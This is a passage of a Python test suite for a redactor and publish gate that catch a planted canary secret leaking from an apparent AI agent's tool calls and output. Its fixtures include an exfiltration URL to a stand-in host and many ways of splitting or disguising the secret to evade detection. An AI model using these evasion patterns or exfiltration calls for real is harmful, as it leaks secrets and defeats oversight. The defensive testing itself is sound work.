    # The tail is under PRINT_BUDGET_HEX digits, so only the held head can mark it.
    out = k.redact_events(events_of(*decoys, call(u="?a=" + value[:30]),
                                    call(u="?b=" + value[30:])), hashes, lengths)
    assert out[-1]["data"]["arguments"] == {"u": k.CANARY}


def test_the_longest_continuations_are_the_ones_held():
    """A call with more one-digit words than HELD_EXTENSIONS still keeps the real middle."""
    value, hashes, lengths = new_canary()
    junk = " ".join("a" for _ in range(k.HELD_EXTENSIONS + 16))
    # The tail is under PRINT_BUDGET_HEX digits, so only the held continuation
    # can mark it.
    out = k.redact_events(events_of(call(u="?a=" + value[:10]),
                                    call(j=junk, m="?m=" + value[10:30]),
                                    call(u="?z=" + value[30:])), hashes, lengths)
    assert out[2]["data"]["arguments"] == {"u": k.CANARY}


def test_the_live_redactor_refuses_model_output_out_of_order():
    _, hashes, lengths = new_canary()
    take = k.TakeRedactor(hashes, lengths)
    first, second = events_of(("model_delta", {"text": "a"}), ("model_delta", {"text": "b"}))
    take.event(second)
    with pytest.raises(k.CanaryWindowError, match="increasing seq"):
        take.event(first)


# --- fix round 4: a split across events, decided by the take's own verdict --------
#
# The take redactor replaces the head of a cross-call split when it arrives,
# which is right for the pane but leaves the emitted stream with nothing for a
# gate to pair: at d9a6061 a tail sent before its head, or a head whose tail
# went to model output, passed a gate over the emitted stream in 58 of 64 (the
# bare tail-first form was refused at 271b8c7, so that was a regression). The
# fix makes the take carry its own verdict, `TakeRedactor.publish_errors`,
# decided over the raw events it kept rather than the redacted ones, so both
# pieces are still there to pair. These families were strict xfail at 810aa89
# and are now refused; the harness calls `take.publish_errors()` in place of
# gating the emitted stream.

SPLIT_ACROSS_EVENTS = {
    "calls-head-first": lambda c, i: events_of(call(u=c[:i]), call(u=c[i:])),
    "calls-tail-first": lambda c, i: events_of(call(u=c[i:]), call(u=c[:i])),
    "calls-tail-first-url-parameters": lambda c, i: events_of(
        call(u="https://x.example/?b=" + c[i:]), call(u="https://x.example/?a=" + c[:i])),
    "tool-argument-head-model-output-tail": lambda c, i: events_of(
        call(u="?a=" + c[:i]), ("model_delta", {"text": "and the rest is " + c[i:] + " ok"})),
    "model-output-head-tool-argument-tail": lambda c, i: events_of(
        ("model_delta", {"text": "sure: " + c[:i] + "\n"}), call(u="?b=" + c[i:])),
    "model-output-text-between-the-halves": lambda c, i: events_of(
        ("model_delta", {"text": "part 1: " + c[:i] + " and part 2: " + c[i:]})),
    "model-output-halves-reversed": lambda c, i: events_of(
        ("model_delta", {"text": "part 2: " + c[i:] + " and part 1: " + c[:i]})),
}
# Pieces that are whole strings, so the key-free shape rule refuses them as well
# as the keyed fragment join. Asserted separately, so a mutant that turns off
# either rule alone is still caught.
WHOLE_STRING_PIECES = {"calls-head-first", "calls-tail-first"}
SHAPE_RULE = "published shape"
# The take redactor redacts this family in place, so nothing is left on the pane
# to leak; the raw-events verdict still refuses it.
REDACTED_IN_PLACE = {"calls-head-first"}


def take_over(events, hashes, lengths):
    """Feed events through a live TakeRedactor as the harness does, and return
    (emitted stream, the take). The take's `finish` tail is appended to the last
    model_delta, exactly as `redact_events` and the harness assemble it."""
    take = k.TakeRedactor(hashes, lengths)
    out = [take.event(ev) for ev in events]
    tail = take.finish()
    if tail:
        for ev in reversed(out):
            if ev["type"] == k.STREAM_TYPE:
                ev["data"]["text"] += tail
                break
    return out, take


@pytest.mark.parametrize("family", sorted(SPLIT_ACROSS_EVENTS))
def test_a_canary_split_across_events_is_refused_by_the_takes_own_verdict(family):
    shown = 0
    for _ in range(2):
        value, hashes, lengths = new_canary()
        for cut in range(1, 41):
            out, take = take_over(SPLIT_ACROSS_EVENTS[family](value, cut), hashes, lengths)
            # The emitted stream matches the batch path bit for bit; the verdict
            # is what changed, not what reaches the pane.
            assert out == k.redact_events(SPLIT_ACROSS_EVENTS[family](value, cut),
                                          hashes, lengths)
            if exposed_hex(out, value) <= 2:
                continue  # redacted in place: nothing left on the pane to leak
            shown += 1
            errs = take.publish_errors()
            assert any(FRAGMENT_JOIN in e for e in errs), (family, cut, errs)
            if family in WHOLE_STRING_PIECES:
                assert any(SHAPE_RULE in e for e in errs), (family, cut, errs)
            assert all(value[len(k.SHAPE_PREFIX):][j:j + 6] not in e
                       for e in errs for j in range(27))
    # Most cuts leave digits on the pane for a family the redaction does not
    # close, so the verdict is what decides it. A family that stopped leaking
    # would make the loop above vacuous. Tail-first redacts its small cuts in
    # place (the long tail alone reconstructs the canary), so the floor is well
    # under the 80 cases without being vacuous.
    if family in REDACTED_IN_PLACE:
        assert shown == 0, (family, shown)
    else:
        assert shown >= 40, (family, shown)


def test_the_verdict_reads_the_raw_events_not_the_redacted_ones():
    """The core of the C1 fix: on tail-first the take refuses, but a gate over
    what it emits does not, because the emitted stream lost the head."""
    value, hashes, lengths = new_canary()
    events = SPLIT_ACROSS_EVENTS["calls-tail-first"](value, 20)
    out, take = take_over(events, hashes, lengths)
    assert any(FRAGMENT_JOIN in e for e in take.publish_errors())
    # The emitted stream alone misses it -- that is exactly re-review C1.
    assert not k.publish_errors(out, hashes, lengths)
    # The raw events the take kept are what carry both pieces.
    assert k.publish_errors(events, hashes, lengths)


def test_more_heads_than_held_evict_the_real_one_and_the_take_fails_closed():
    """More than HELD_HEADS literal heads push the real one out of memory, past
    the gate's fragment window on both the pane and the raw events, so the take
    records the eviction and refuses rather than reporting a pass."""
    for _ in range(2):
        value, hashes, lengths = new_canary()
        decoys = [call(u=f"?d=lab-demo-{i:02x}") for i in range(k.HELD_HEADS + 4)]
        events = events_of(call(u="?a=" + value[:20]), *decoys, call(u="?b=" + value[20:]))
        out, take = take_over(events, hashes, lengths)
        assert take._evicted_literal_head
        errs = take.publish_errors()
        assert any("push it out of memory" in e for e in errs), errs
        assert all(value[len(k.SHAPE_PREFIX):][j:j + 6] not in e
                   for e in errs for j in range(27))


def test_a_virtual_head_does_not_evict_or_fail_closed():
    """Only a literal head arms the eviction fail-close. A run of virtual heads
    from ordinary text (the `-4` of `gpt-4`) must not, or benign takes refuse."""
    value, hashes, lengths = new_canary()
    events = events_of(*[call(u=f"gpt-{i:x} top-{i:x}") for i in range(k.HELD_HEADS + 20)])
    _, take = take_over(events, hashes, lengths)
    assert not take._evicted_literal_head
    assert not take.publish_errors()


def test_a_benign_multi_call_run_with_virtual_heads_is_not_blanked():
    """re-review I1: a virtual head held from ordinary text, then pure-hex words
    in later calls, blanked about half of all benign calls at d9a6061. With the
    chain restricted to literal heads, no benign call is rewritten and no canary
    is present, so every call must pass through unchanged."""
    value, hashes, lengths = new_canary()
    # A virtual head ('-4'/'-a'), then many calls of ordinary hex-bearing words.
    words = ["gpt-4 top-10 model", "please add the beacon and read a file",
             "deadbeef cafe face", "a be ace dad", "fix the bad cafe11 bead"]
    take = k.TakeRedactor(hashes, lengths)
    for i in range(60):
        text = words[i % len(words)]
        (ev,) = events_of(call(cmd=text, note=f"step {i:x}"))
        out = take.event(ev)
        assert out["data"]["arguments"] == {"cmd": text, "note": f"step {i:x}"}, (i, text)
    assert not take.publish_errors()


# --- M-9: the take publishes a whole canary it redacted in place -------------
#
# TakeRedactor.publish_errors judged the RAW events, so a whole contiguous
# canary in one field -- the S2a exfiltration url, redacted in place to
# `<canary>` -- was refused even though the published stream carried only the
# placeholder. That false refusal blocked the S2a demo take. The verdict now
# scans the published (redacted) stream for what SURVIVES, and the raw events
# for a SPLIT whose head the redaction blanked (re-review C1). The two scans are
# pinned separately below, so a mutant that drops either disjunct is killed, and
# the allow path is pinned to require actual in-place redaction rather than a
# string that merely looks whole.

def _exfil_url(value):
    # The canary embedded in a real url, exactly the S2a shape (`?k=<canary>`),
    # so the redactor replaces the whole url value with `<canary>`.
    return "http://inbox.test/collect?k=" + value


def test_a_whole_canary_redacted_in_place_is_published_by_the_take():
    """S2a: a whole contiguous canary in one field, redacted in place, is allowed.

    Mutant killed -- reverting the verdict to `publish_errors(self._raw)` (the
    pre-M-9 behavior) refuses this, because the raw events still carry the canary.
    The module gate over the raw events is asserted to still refuse, so the take's
    allowance is the take judging what it ships, not the gate going soft.
    """
    for _ in range(2):
        value, hashes, lengths = new_canary()
        events = events_of(("model_delta", {"text": "I will call fetch."}),
                           call(url=_exfil_url(value)),
                           ("exfil_attempt", {"url": _exfil_url(value)}),
                           ("inbox_received", {"canaryPresent": True}))
        out, take = take_over(events, hashes, lengths)
        # The published stream carries only the placeholder, in both fields.
        assert out[1]["data"]["arguments"]["url"] == k.CANARY
        assert out[2]["data"]["url"] == k.CANARY
        assert value not in json.dumps(out)
        # The take allows it: the M-9 false refusal is gone.
        assert take.publish_errors() == []
        # The split scan alone is silent -- a whole canary in one leaf is not a
        # split, so a mutant that stopped suppressing reach on a whole-shape leaf
        # would make this non-empty and the verdict refuse.
        assert k._split_errors(events, hashes, lengths) == []
        # The module gate over the RAW events still refuses (unchanged behavior).
        assert k.publish_errors(events, hashes, lengths)


# The C1 families whose head the redaction blanks, so the published stream loses
# the anchor and only the raw-events split scan can refuse them.
ANCHOR_BLANKED = ["calls-tail-first", "calls-tail-first-url-parameters",
                  "tool-argument-head-model-output-tail"]


@pytest.mark.parametrize("family", ANCHOR_BLANKED)
@pytest.mark.parametrize("cut", [12, 20, 28])
def test_a_split_whose_head_the_redaction_blanks_is_refused_by_the_raw_split_scan(family, cut):
    """Pins the raw-events split scan alone (re-review C1).

    Mutant killed -- dropping the split disjunct (`survived` only) lets these
    through, because the published stream lost the head that would pair the
    surviving tail. The assertion that the published stream alone passes is what
    attributes the refusal to the split scan and keeps this from being vacuous.
    """
    value, hashes, lengths = new_canary()
    events = SPLIT_ACROSS_EVENTS[family](value, cut)
    out, take = take_over(events, hashes, lengths)
    assert not k.publish_errors(out, hashes, lengths), (family, cut)
    assert any(FRAGMENT_JOIN in e for e in take.publish_errors()), (family, cut)
    # No six-character run of the secret digits appears in any refusal.
    assert all(value[len(k.SHAPE_PREFIX):][j:j + 6] not in e
               for e in take.publish_errors() for j in range(27))


def test_a_whole_canary_in_a_field_the_take_does_not_redact_is_refused():
    """Pins the published survival scan alone, and the 'actual redaction' rule.

    A whole canary in a field the take does not redact (not `tool_call.arguments`
    or `exfil_attempt.url`) survives verbatim into the published stream. It looks
    whole, but it was not redacted, so the allow path must not clear it. Mutant
    killed -- dropping the survival disjunct (`split` only) publishes it, because
    a whole canary in one leaf is not a split.
    """
    for _ in range(2):
        value, hashes, lengths = new_canary()
        events = events_of(("exfil_attempt", {"url": "http://inbox.test/x", "note": value}))
        out, take = take_over(events, hashes, lengths)
        assert value in json.dumps(out), "the take does not redact `note`, so it survives"
        assert k._split_errors(events, hashes, lengths) == [], "a whole canary in one leaf is no split"
        assert take.publish_errors(), "the survival scan must refuse a surviving whole canary"


def test_a_partial_head_that_reaches_the_published_stream_is_refused():
    """A head/tail piece that survives into the published stream is refused.

    A literal prefix with a partial run of digits in model output is not a whole
    canary, so the rolling window leaves it in the clear. The survival scan's
    partial-head rule refuses it. The split scan is silent (no tail to pair), so
    this pins the survival disjunct on a partial rather than a whole value.
    """
    for _ in range(2):
        value, hashes, lengths = new_canary()
        head = value[:len(k.SHAPE_PREFIX) + 12]  # lab-demo- + 12 hex, no tail
        events = events_of(("model_delta", {"text": "the token starts " + head + " then stops"}))
        out, take = take_over(events, hashes, lengths)
        assert head in out[0]["data"]["text"], "a partial head is not a whole canary, so it survives"
        assert k._split_errors(events, hashes, lengths) == []
        assert any("head of a canary" in e for e in take.publish_errors())


def test_split_errors_runs_the_reach_rule_and_suppresses_it_on_a_whole_leaf():
    """`_split_errors` keeps the key-free reach rule, but not on a whole-shape leaf.

    A prefix-intact split whose tail is cut into pieces with alphabet filler is
    reached only by `_prefix_reach` -- the split scan must carry it. The same
    scan must stay silent on a single field holding the whole canary, or S2a
    would refuse. Pins the `reached_events - whole_leaf_events` construction.
    """
    import random
    rng = random.Random(20260929)
    for _ in range(20):
        value, hashes, lengths = new_canary()
        body = value[len(PREFIX):]
        pieces = [PREFIX + body[:3], body[3:11], body[11:20], body[20:26], body[26:]]
        fillers = [""] + [_filler("alphabet", rng, rng.randint(1, 4)) for _ in pieces[1:]]
        events = _place(pieces, fillers, ["tool"] * len(pieces))
        assert any("within the window" in e for e in k._split_errors(events, hashes, lengths))
        # The same rule is silent on a whole canary sitting in one field.
        whole = events_of(("exfil_attempt", {"url": _exfil_url(value)}))
        assert not any("within the window" in e for e in k._split_errors(whole, hashes, lengths))


def test_the_take_verdict_holds_zero_false_positives_on_a_benign_corpus():
    """A benign multi-event take, no canary anywhere, publishes cleanly.

    The M-9 change adds a survival scan over the published stream and a split
    scan over the raw events; neither may refuse a take that never carried a
    canary. Measured false-positive rate across the corpus is 0.
    """
    value, hashes, lengths = new_canary()  # keyed, but the corpus never emits it
    corpus = [
        events_of(("model_delta", {"text": "Let me search the notes and then fetch."}),
                  call(query="quarterly report", limit="10"),
                  ("exfil_attempt", {"url": "https://changelog.test/v/1a2b3c4d5e6f7890"})),
        events_of(("model_delta", {"text": "commit deadbeefcafe1234 looks fine"}),
                  call(url="https://x.example/?rev=0123456789abcdef0123456789abcdef")),
        events_of(*[call(u=f"gpt-{i:x} top-{i:x} add be ace dad") for i in range(20)]),
        events_of(("model_delta", {"text": "the uuid is 3b0c8f0e-6c1c-4b8e-9d5e-2f7a1c9e0b11"}),
                  call(path="notes/lab-demo-report.md")),  # near-miss: no trailing hyphen+hex
        events_of(("tool_call", {"name": "fetch", "arguments": {"url": "http://inbox.test/x"}}),
                  ("inbox_received", {"canaryPresent": False})),
    ]
    refused = 0
    for events in corpus:
        _, take = take_over(events, hashes, lengths)
        if take.publish_errors():
            refused += 1
    assert refused == 0, f"{refused}/{len(corpus)} benign takes were refused"


# --- widened gate: literal heads, prefix-intact splits, case, revision (M-7, M-8) ---
#
# The Jetson measured that TakeRedactor.publish_errors missed a canary split
# across tool_call / model_delta pieces with hexadecimal (alphabet) filler
# between the pieces, and a literal head in model output. These pin the widened
# gate by construction: any split that leaves the literal prefix whole in one
# piece is refused however the 32 digits after it are broken up, and a literal
# head is refused on its own. Each canary is drawn per test, so no shaped literal
# is committed. Filler is drawn to be either inside the shape's alphabet (which
# glues to a piece) or outside it.

PREFIX = k.SHAPE_PREFIX
_CLASS = k.SHAPE_HEX + "lmo-"          # characters that merge into a fragment run
_NONCLASS = " =?&/;:.%()[]"            # characters that break a fragment run


def _filler(kind: str, rng, n: int) -> str:
    if kind == "none":
        return ""
    pool = _CLASS if kind == "alphabet" else _NONCLASS
    return "".join(rng.choice(pool) for _ in range(n))


def _place(pieces, fillers, carriers):
    """A stream with each (filler + piece) in its own carrier, in the given order."""
    evs = []
    for idx, (piece, fill, car) in enumerate(zip(pieces, fillers, carriers)):
        text = fill + piece
        if car == "delta":
            evs.append({"v": 1, "seq": idx + 1, "t": float(idx), "run": "m",
                        "type": "model_delta", "data": {"text": text}})
        else:
            evs.append({"v": 1, "seq": idx + 1, "t": float(idx), "run": "m",
                        "type": "tool_call", "data": {"name": "fetch",
                                                      "arguments": {f"p{idx}": text}}})
    return evs


# The head-length domain is written as literals, not as range(PARTIAL_HEAD_MIN_HEX,
# ...), on purpose: a range derived from the constant moves with a mutation of it
# and so never pins its value. Eight and thirty-one are the just-at and the
# last-before-the-whole-shape lengths for the threshold as it stands; the
# just-below and just-at pair (7 and 8) is pinned independently below.
@pytest.mark.parametrize("kdigits", list(range(8, k.SHAPE_HEX_CHARS)))
def test_a_literal_canary_head_in_model_output_is_refused(kdigits):
    """The prefix and 8..31 digits of the canary: a near-total leak the gate let through.

    Keyless: the head is refused whether or not the digits are the real canary's,
    because spec 6 bans anything shaped like a canary's head. The full 32-digit
    value is the whole-shape case, pinned elsewhere.
    """
    value, hashes, lengths = new_canary()
    head = PREFIX + value[len(PREFIX):len(PREFIX) + kdigits]
    events = events_of(("model_delta", {"text": "the token is " + head + " ok"}))
    assert any("head of a canary" in e for e in k.shape_errors(events))
    assert k.publish_errors(events, hashes, lengths)


def test_a_full_canary_in_model_output_is_the_whole_shape_case():
    """k = 32 (the full body) is refused by the whole-shape rule, closing the '31+' range."""
    value, hashes, lengths = new_canary()
    events = events_of(("model_delta", {"text": "the token is " + value + " ok"}))
    assert any("shaped like a canary" in e for e in k.shape_errors(events))
    assert k.publish_errors(events, hashes, lengths)


def test_the_head_threshold_is_exactly_eight_digits():
    """The boundary, pinned with literals independent of the constant under test.

    Seven hexadecimal digits after the literal prefix is not a head; eight is. The
    lengths are hardcoded, not derived from PARTIAL_HEAD_MIN_HEX, so a mutant that
    raises the constant (8 -> 9) is killed here directly: the eight-digit case
    then stops being a head and the refusal it must produce disappears. A mutant
    that lowers it flips the seven-digit case. Both are behavioral assertions
    against the shape rule, not the value the code produced.
    """
    value, hashes, lengths = new_canary()
    body = value[len(PREFIX):]
    seven = events_of(("model_delta", {"text": "t " + PREFIX + body[:7] + " x"}))
    eight = events_of(("model_delta", {"text": "t " + PREFIX + body[:8] + " x"}))
    assert not any("head of a canary" in e for e in k.shape_errors(seven))
    assert k.publish_errors(seven, hashes, lengths) == []
    assert any("head of a canary" in e for e in k.shape_errors(eight))
    assert k.publish_errors(eight, hashes, lengths)


@pytest.mark.parametrize("kdigits", list(range(0, 8)))
def test_a_prefix_with_too_few_digits_is_not_a_head(kdigits):
    """Below the boundary: zero through seven digits after the prefix is not refused.

    Literal 0..7, independent of the constant, so this reads a fixed below-boundary
    band rather than a band that shifts with a mutation of PARTIAL_HEAD_MIN_HEX.
    """
    value, hashes, lengths = new_canary()
    head = PREFIX + value[len(PREFIX):len(PREFIX) + kdigits]
    events = events_of(("model_delta", {"text": "the token is " + head + " ok"}))
    assert k.shape_errors(events) == []
    assert k.publish_errors(events, hashes, lengths) == []


@pytest.mark.parametrize("carrier", ["tool", "delta", "mixed"])
@pytest.mark.parametrize("npieces", [2, 3, 5, 7])
@pytest.mark.parametrize("fill_kind", ["none", "nonalpha", "alphabet"])
def test_a_prefix_intact_split_is_refused_however_the_tail_is_broken(carrier, npieces, fill_kind):
    """A canary split with the prefix whole in one piece is refused, any filler, any carrier.

    The tail is cut into npieces - 1 pieces so the prefix survives whole in the
    first piece; the pieces then carry hexadecimal or non-hexadecimal filler
    between them and land across tool calls, model output, or a mix. This is the
    Jetson's measured miss, closed by construction.
    """
    import random
    rng = random.Random(hash((carrier, npieces, fill_kind)) & 0xffff)
    for _ in range(8):
        value, hashes, lengths = new_canary()
        body = value[len(PREFIX):]
        cuts = sorted(rng.sample(range(1, len(body)), npieces - 2)) if npieces > 2 else []
        bounds = [0] + cuts + [len(body)]
        tail = [body[a:b] for a, b in zip(bounds, bounds[1:])]
        pieces = [PREFIX + tail[0]] + tail[1:] if tail else [value]
        fillers = [""] + [_filler(fill_kind, rng, rng.randint(1, 6)) for _ in pieces[1:]]
        if carrier == "mixed":
            cars = ["tool" if i % 2 else "delta" for i in range(len(pieces))]
        else:
            cars = [carrier] * len(pieces)
        events = _place(pieces, fillers, cars)
        assert any(PREFIX in p for p in pieces), "the prefix must stay whole for this case"
        assert k.publish_errors(events, hashes, lengths), (carrier, npieces, fill_kind, pieces)


def test_the_reach_rule_is_a_key_free_catch_distinct_from_the_head_and_whole_rules():
    """A glued prefix-intact split that only `_prefix_reach` reaches, keylessly.

    The prefix piece carries fewer than PARTIAL_HEAD_MIN_HEX digits, so the head
    rule is silent; no string holds a whole 41-character shape, so the whole-shape
    rule is silent; the tail is cut into more than three pieces with alphabet
    filler, so the shape assembly and the keyed completion do not reach it. What
    is left is the reach rule, and it fires. A mutant that drops reach empties
    `shape_errors` on this input.
    """
    import random
    rng = random.Random(20260929)
    fired = 0
    for _ in range(40):
        value, hashes, lengths = new_canary()
        body = value[len(PREFIX):]
        pieces = [PREFIX + body[:3]] + [body[3:11], body[11:20], body[20:26], body[26:]]
        fillers = [""] + [_filler("alphabet", rng, rng.randint(1, 4)) for _ in pieces[1:]]
        events = _place(pieces, fillers, ["tool"] * len(pieces))
        errs = k.shape_errors(events)
        assert not any("shaped like a canary" in e for e in errs), "whole-shape rule should be silent"
        assert not any("head of a canary" in e for e in errs), "head rule should be silent"
        if any("within the window" in e for e in errs):
            fired += 1
        assert k.publish_errors(events, hashes, lengths)
    assert fired == 40, f"reach fired on only {fired}/40"


def test_the_reach_threshold_is_exactly_a_full_tail():
    """Off-by-one, pinned: 32 reachable hexadecimal digits refuse, 31 do not.

    Built from a synthetic prefix and hexadecimal that is not the key, so only the
    key-free reach rule can speak: the whole-shape and head rules stay silent (the
    prefix piece holds three digits, and the tail is split). A mutant that makes
    the test `> SHAPE_HEX_CHARS` lets the 32-digit case slip and is killed.
    """
    import secrets
    hashes, lengths = k.key_material(k.make_canary())  # a key that none of this matches
    for total, refuse in ((k.SHAPE_HEX_CHARS, True), (k.SHAPE_HEX_CHARS - 1, False)):
        # One model_delta so no interleaved key or tool-name hex enters the count:
        # a three-digit run right after the prefix, a non-alphabet break, then the
        # rest of the tail, for `total` hexadecimal characters after the prefix.
        text = "x " + PREFIX + "abc" + " " + "f" * (total - 3) + " y"
        events = events_of(("model_delta", {"text": text}))
        errs = k.shape_errors(events)
        assert not any("shaped like a canary" in e or "head of a canary" in e for e in errs), (total, errs)
        assert bool(any("within the window" in e for e in errs)) == refuse, (total, errs)


def test_a_case_changed_canary_is_refused_and_redacted():
    """Upper, mixed, prefix-only-upper, hex-only-upper: the keyed scans fold case.

    Asserted on the keyed side (the shape rules stay case-exact), so it pins the
    fold in `_sha256_hex`: a mutant that drops the fold leaves the keyed check
    empty on an uppercase canary and is killed.
    """
    value, hashes, lengths = new_canary()
    disguises = [value.upper(),
                 value[:len(PREFIX)].upper() + value[len(PREFIX):],
                 value[:len(PREFIX)] + value[len(PREFIX):].upper(),
                 "".join(c.upper() if i % 3 else c for i, c in enumerate(value))]
    for d in disguises:
        events = events_of(("model_delta", {"text": "out " + d + " end"}))
        keyed = [e for e in k.publish_errors(events, hashes, lengths) if e not in k.shape_errors(events)]
        assert keyed, ("keyed scan missed a case-changed canary", d)
        assert k.redact_value({"x": d}, hashes, lengths) == {"x": k.CANARY}
        r = k.SplitCanaryRedactor(hashes, lengths)
        assert r.feed(d) + r.finish() == k.CANARY


def test_a_case_changed_run_that_is_not_the_canary_is_left_alone_by_the_keyed_scan():
    """The fold matches the key, not the shape: an uppercase non-canary is not keyed."""
    import secrets
    value, hashes, lengths = new_canary()
    bogus = (PREFIX + secrets.token_hex(16)).upper()
    assert value.upper() not in bogus
    events = events_of(("model_delta", {"text": bogus}))
    keyed = [e for e in k.publish_errors(events, hashes, lengths) if e not in k.shape_errors(events)]
    assert keyed == []
    assert k.redact_value({"x": bogus}, hashes, lengths) == {"x": bogus}


def test_a_tail_with_hex_glued_before_it_is_blanked_on_the_pane():
    """The offset search in `_completes`: a tail's digits are read at any offset.

    A head in one value (prefix and a few digits, with non-hexadecimal text
    around it so the shape assembly cannot pair it), and the tail in another with
    hexadecimal glue before it and text after. A prefix-only read of the closer
    (`c[:need]`) reads the glue and misses; the offset search reads the digits
    out wherever they sit. The pane redactor, not the gate's reach rule, is what
    this pins, so it asserts the blanking, not the refusal. A mutant that reverts
    `_hex_windows` to a prefix-only read leaves the tail in clear (measured:
    29 digits exposed) and is killed.
    """
    for cut in (12, 15, 20, 25):
        value, hashes, lengths = new_canary()
        args = {"h": "note " + value[:cut] + " end",
                "t": "deadbeef" + value[cut:] + " tail", "x": "plain"}
        out = k.redact_value(args, hashes, lengths)
        assert out["x"] == "plain"
        assert exposed_hex(out, value) <= 2, (cut, out)


def test_the_reach_count_stops_at_the_next_prefix_so_short_mentions_do_not_sum():
    """A tail carries no `lab-demo-`, so one prefix's reach stops at the next.

    Thirty short `lab-demo-<2 digits>` mentions, each far below a head and each
    followed by another prefix, must not sum into a full tail. A mutant that drops
    the stop-at-next-prefix counts every mention's digits together, crosses
    SHAPE_HEX_CHARS, and refuses this stream; stopping at the next prefix keeps it
    a pass. The prefix appearing at all is contrived (a benign take never emits
    it), so this pins the reach rule's precision, not a real benign stream.
    """
    value, hashes, lengths = new_canary()
    stream = [{"v": 1, "seq": i + 1, "t": float(i), "run": "m", "type": "model_delta",
               "data": {"text": PREFIX + "ab"}} for i in range(30)]
    assert k.publish_errors(stream, hashes, lengths) == []


def _revision_event(seq, rev):
    return {"v": 1, "seq": seq, "t": float(seq), "run": "m", "type": "run_started",
            "data": {"scenario": "rug-pull", "gate": "enforce", "revision": rev}}


def test_the_run_started_revision_neither_triggers_nor_hides_a_canary():
    """M-8 gap 2: the model revision is not a canary, and a real canary is caught regardless of it.

    A hex revision on its own is clean, and a prefix-intact split is refused the
    same whether the revision is a 40-hex sha or a plain name. The catch does not
    depend on the revision's hex, and the revision's hex does not cause a catch.
    """
    import secrets
    value, hashes, lengths = new_canary()
    sha = secrets.token_hex(20)
    # a hex revision on its own, plus benign tool traffic, is clean
    benign = [_revision_event(1, sha),
              {"v": 1, "seq": 2, "t": 2.0, "run": "m", "type": "tool_call",
               "data": {"name": "fetch", "arguments": {"url": "https://x/" + secrets.token_hex(8)}}}]
    assert k.publish_errors(benign, hashes, lengths) == []
    # a prefix-intact split, refused the same with a hex revision or a plain one
    body = value[len(PREFIX):]
    split = [(PREFIX + body[:4]), body[4:18], body[18:]]
    decisions = set()
    for rev in (sha, "HEAD"):
        events = [_revision_event(1, rev)] + _place(split, ["", "l-", "o-"], ["tool"] * 3)[0:]
        # renumber seq so the run_started is first
        for j, ev in enumerate(events):
            ev["seq"] = j + 1
        decisions.add(bool(k.publish_errors(events, hashes, lengths)))
    assert decisions == {True}, "the catch changed with the revision's hex"


def test_benign_calls_with_hex_ids_still_pass_the_gate():
    """No canary, no prefix: revisions, shas, UUIDs and hex ids do not refuse."""
    import secrets
    value, hashes, lengths = new_canary()
    streams = [
        [{"v": 1, "seq": 1, "t": 0.0, "run": "m", "type": "model_delta",
          "data": {"text": "searching notes for the policy at rev " + secrets.token_hex(20)}}],
        [{"v": 1, "seq": 1, "t": 0.0, "run": "m", "type": "tool_call",
          "data": {"name": "fetch", "arguments": {"url": "https://x/?id=" + secrets.token_hex(16)}}}],
        [{"v": 1, "seq": 1, "t": 0.0, "run": "m", "type": "tool_call",
          "data": {"name": "read", "arguments": {"path": "/a/" + secrets.token_hex(8) + "/b"}}}],
    ]
    for s in streams:
        assert k.publish_errors(s, hashes, lengths) == [], s
